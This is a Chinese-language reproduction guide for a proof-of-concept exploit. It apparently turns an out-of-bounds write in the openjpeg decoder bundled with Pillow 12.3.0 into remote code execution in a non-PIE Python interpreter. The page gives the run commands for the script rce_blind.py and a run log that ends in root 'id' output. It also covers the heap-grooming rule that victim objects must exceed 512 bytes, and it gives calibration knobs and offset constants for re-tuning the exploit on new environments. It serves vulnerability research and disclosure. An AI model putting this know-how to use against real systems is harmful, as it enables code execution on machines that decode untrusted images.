# 复现步骤（可直接照抄）

## 0. 环境要求

| 项 | 要求 |
|---|---|
| 系统 | Linux（本仓库实测：Android 手机上的 Ubuntu 容器 / aarch64） |
| Python | 3.12 |
| 关键依赖 | **Pillow 12.3.0**（其自带的 vendored `openjpeg 2.5.4`） |
| 目标解释器 | **非 PIE**（`readelf -h $(which python3) \| grep Type` → `EXEC`） |
| 内存 | 需要能放下 14 MB 的图片文件 |

检查命令：

```bash
python3 -c "import PIL; print('Pillow', PIL.__version__)"      # 期望 12.3.0
readelf -h $(readlink -f $(which python3)) | grep Type          # 期望 EXEC（非 PIE）
```

---

## 1. 三条命令复现

```bash
# ① 进入 PoC 目录（仓库里的 exp/）
cd /tmp/ourpy            # 或你 clone 下来的 exp/ 目录

# ② 确保没有和标准库同名的脚本（详见第 4 节的坑）
ls *.py | grep -E '^(bisect|random|tempfile|selectors|subprocess|types)\.py$' && echo "有冲突文件，先改名！"

# ③ 跑
PYTHONSAFEPATH=1 python3 -u rce_blind.py
```

**真实运行日志**（本仓库 `docs/proof_run.log`，可自行对照）：

```
[i] blob=0xd79d30 fake_type=0xd79d70
[i] build: OK len=14130482 p1=10717229 pB=2 pC=3412414 S_N=0xa38b50
[i] 相邻对 126/128
[i] 洞已放好，解码...
[i] 解码完成
[+] HIT tuple@0xe6fb30  item2 = blob(0xd79d30) ✓
uid=0(root) gid=0(root) groups=0(root),3001(android_group_3001),...
sh: 1: jd: not found
```

关键三行：

| 行 | 含义 |
|---|---|
| `相邻对 126/128` | 堆编排成功：数组的邻居就是我们的对象 |
| `HIT tuple@… item2 = blob(…)` | 图片的越界写**真的**把元组元素改成了我们的缓冲区 |
| `uid=0(root) …` | `system("id")` 被执行 ⇒ **RCE 成立** |

> 最后那行 `jd: not found` 是脚本故意做的"INCREF 补偿自校准"（会依次试几个偏移），
> 命中 `uid=` 的那一次就是正确补偿 —— 属于预期输出，不是错误。

---

## 2. 想要更"干净"的输出

编辑 `rce_blind.py`，把触发循环固定成命中值，就不会再打印 `not found`：

```python
for k in range(1, 2):     # 只跑 k=1（实测命中值）
```

---

## 3. 截图怎么弄（交给设备主人）

任选一种：

```bash
# 方式 A：命令行截图（需要 root / Shizuku）
screencap -p /sdcard/proof.png

# 方式 B：手机自带截屏（同时按 电源+音量下），再裁剪
```

然后：

1. 把图片放进仓库 `docs/` 目录，命名 **`proof.png`**；
2. README 里已经预留了引用：`![实测截图](docs/proof.png)` —— 放进去就会自动显示 ✓

---

## 4. ⚠️ 复现必看的两个坑（我自己踩过，代价很大）

### 坑 1：脚本名不能和 Python 标准库重名

我早期在 `/tmp` 下放了 `bisect.py`（用来做二分测试），
而 Python 的 `random` 模块里有 `from bisect import bisect`
⇒ 因为"脚本所在目录"在搜索路径最前面，**标准库被我的脚本顶掉**
⇒ 每次 `import random`（进而 `tempfile`、进而 `PIL`）都会去执行我那个脚本
⇒ 它内部又会不断开子进程 ⇒ **短时间起了 442 个进程 ⇒ 内存耗尽 ⇒ 手机把桌面/QQ 都杀了**。

**规避**：跑之前清掉同名脚本，并用 `PYTHONSAFEPATH=1`（禁止把脚本目录加进搜索路径）。

### 坑 2：受害者对象必须 > 512 字节

CPython 的小对象池（pymalloc）只管 ≤512 字节的对象，
超过 512 字节才走 glibc 的 malloc。
越界写的落点在 glibc 堆上 ⇒ **只有 >512 字节的对象才可能成为"邻居"**：

```
tuple(5)   =  64 B  → pymalloc（另一片内存）⇒ 永远不相邻 ✗
bytes(519) = 552 B  → glibc          ⇒ 相邻 ✓
tuple(110) = 904 B  → glibc          ⇒ 相邻 ✓
```

---

## 5. 没命中怎么办（三个旋钮）

脚本里所有常量都来自实测，换环境（不同 Python/不同 libc）后可能需要校准：

| 旋钮 | 位置 | 说明 |
|---|---|---|
| `A_VAL = PY_TUPLE - 0x0c` | `rce_blind.py` | 实测 `ob_type` 槽写的是 `A+12` |
| `C_VAL = bd - 4` | `rce_blind.py` | 实测 `item2` 槽写的是 `C+4` |
| `'-370', '4'` | `rce_blind.py` 调 `mk13.py` | builder 的两个偏移旋钮（e1 / e2） |

**校准方法**：脚本里已内置"裸读 dump"（`OFFS` 那一段）——重新打开它，
它会打印被改写对象的 **6 个槽的真实值**，和上面的表对照即可算出新的常数。

---

## 6. 免责

仅限本地环境安全研究复现，请勿用于未授权目标。